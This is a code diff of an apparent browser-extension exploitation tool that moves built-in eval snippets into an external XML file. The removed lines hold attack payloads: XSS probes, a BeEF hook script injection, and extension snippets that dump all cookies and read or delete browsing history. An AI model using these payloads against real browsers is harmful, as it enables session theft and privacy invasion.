@@ -763,129 +763,34 @@ d.body.appendChild(s);\n\
             }
         }, 2000);
     }
-
-    var snippets = {};
-    snippets['xhr'] = "x = new XMLHttpRequest();\n\
-x.onreadystatechange = function() {\n\
-if (x.readyState == 4) {\n\
-   __p.postMessage({cmd:'recveval', p: x.responseText});\n\
-}\n\
-};\n\
-x.open('GET','/',true);\n\
-x.send(null);\n\
-";
-    snippets['alert'] = 'alert(/xss/);';
-    snippets['location'] = 'location;';
-    snippets['list scripts'] = 'var s = [];\n\
-for (i=0;i<document.scripts.length;i++) {\n\
-s.push(document.scripts[i].src || document.scripts[i].textContent);\n\
-}\n\
-s;';
-    snippets['add script'] = "(function() {\n\
-var d=document;\n\
-var s = d.createElement('script');\n\
-s.src = 'script.js';\n\
-d.body.appendChild(s);\n\
-})();";
-
-    snippets['BeEF init part 1'] = "(function() {\n\
-var d=document;\n\
-var s = d.createElement('script');\n\
-s.src = 'http://127.0.0.1:3000/hook.js'; // BeEF hook here\n\
-d.body.appendChild(s);\n\
-})();";
-
-    snippets['BeEF init part 2'] = "beef_init(); // run this outside sandbox";
     
-    var ext_snippets = {};
-    
-    ext_snippets['get cookies'] = '//extension needs cookies permission\n\
-chrome.cookies.getAll({\n\
-  // comment out following line to get cookies for all domains\n\
-  url:"https://www.google.com/"\n\
-}, function(cookies) {\n\
-  log({type:"recveval",result: cookies});\n\
-})'
-    ext_snippets['set cookie'] = "//extension needs cookies permission\n\
-chrome.cookies.set({\n\
-  url: 'https://www.google.com/',\n\
-  name: 'test-chef',\n\
-  value: 'test-ok',\n\
-  secure: true,\n\
-  httpOnly: true,\n\
-  expirationDate: 1417390624, // unix timestamp or null for session cookie\n\
-  path: '/'\n\
-}, function(c) {\n\
-  log({type:'recveval',result: c});\n\
-})";
-    ext_snippets['remove cookie'] = "//extension needs cookies permission\n\
-chrome.cookies.remove({\n\
-  url: 'https://www.google.com/',\n\
-  name: 'test-chef'\n\
-}, function(c) {\n\
-  log({type:'recveval',result: c});\n\
-})";
-    ext_snippets['have you visited google?'] = "// requires history permission\n\
-chrome.history.getVisits({\n\
-  url: 'http://www.google.com/'\n\
-}, function(visits) {\n\
-  log({type:'recveval',result: visits});\n\
-})";
-
-    ext_snippets['search history'] = "// requires history permission\n\
-chrome.history.search({\n\
-  text: 'google'\n\
-}, function(r) {\n\
-  log({type:'recveval',result: r});\n\
-})";
-
-    ext_snippets['delete URL from history'] = "// requires history permission\n\
-chrome.history.deleteUrl({\n\
-  url: 'http://www.example.com/'\n\
-})";
-
-    ext_snippets['do I have file:// access?'] = "chrome.extension.isAllowedFileSchemeAccess(function(yes) {\n\
-    log({type:'recveval',result: yes});\n\
-    })";
-    
-    ext_snippets['get manifest'] = "x = new XMLHttpRequest();\n\
-x.onreadystatechange = function() {\n\
-   var d;\n\
-  try {\n\
-    d=JSON.parse(x.responseText);\n\
- } catch (e) {d=x.responseText}\n\
-if (x.readyState == 4) {\n\
-   log({type:'recveval', result:d});\n\
-}\n\
-};\n\
-x.open('GET','/manifest.json',true);\n\
-x.send(null);";
+    $.get('snippets.xml', function(xml) {
+        $(xml).find('snippet').each(function() {
+            var name = $(this).attr('name');
+            var type = $(this).attr('type');
+            var code = $.trim($(this).text());
+            $('#' + type).append(
+                $('<option>')
+                .val(code)
+                .text(name)
+            );
+        });
+    }, 'xml'); 
 
     $("#eval-snippets").change(function() {
         var val = $(this).val();
-        if (val && snippets[val]) {
-            $('textarea[name=eval]').val(snippets[val]);
+        if (val) {
+            $('textarea[name=eval]').val(val);
         }
     });
-    
-    for (var i in snippets) { // populate snippets
-        if (snippets.hasOwnProperty(i)) {
-            $('#eval-snippets').append($('<option>').val(i).text(i));
-        }
-    }
 
     $("#eval-ext-snippets").change(function() {
         var val = $(this).val();
-        if (val && ext_snippets[val]) {
-            $('textarea[name=eval-ext]').val(ext_snippets[val]);
+        if (val) {
+            $('textarea[name=eval-ext]').val(val);
         }
     });
-    
-    for (var i in ext_snippets) { // populate snippets
-        if (ext_snippets.hasOwnProperty(i)) {
-            $('#eval-ext-snippets').append($('<option>').val(i).text(i));
-        }
-    }
+
     // start with saved data
     refreshTabsTable(hookStorage.getTabs(hook));
     al("Refreshed state from local storage");
